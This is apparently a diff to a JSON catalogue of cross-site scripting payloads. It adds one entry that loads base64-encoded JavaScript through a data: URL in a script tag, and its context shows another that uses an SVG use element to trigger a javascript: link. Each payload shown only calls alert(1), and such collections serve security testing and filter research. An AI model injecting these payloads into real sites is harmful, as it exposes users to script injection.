@@ -132,6 +132,16 @@
         ]
     },
     {
+        "description": "Data protocol inside script src with base64",
+        "code": "<script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
         "description": "SVG use element Chrome\/Firefox",
         "code": "<svg><use href=\"data:image\/svg+xml,<svg id='x' xmlns='http:\/\/www.w3.org\/2000\/svg' xmlns:xlink='http:\/\/www.w3.org\/1999\/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' \/><\/a><\/svg>#x\"><\/use><\/svg>",
         "browsers": [
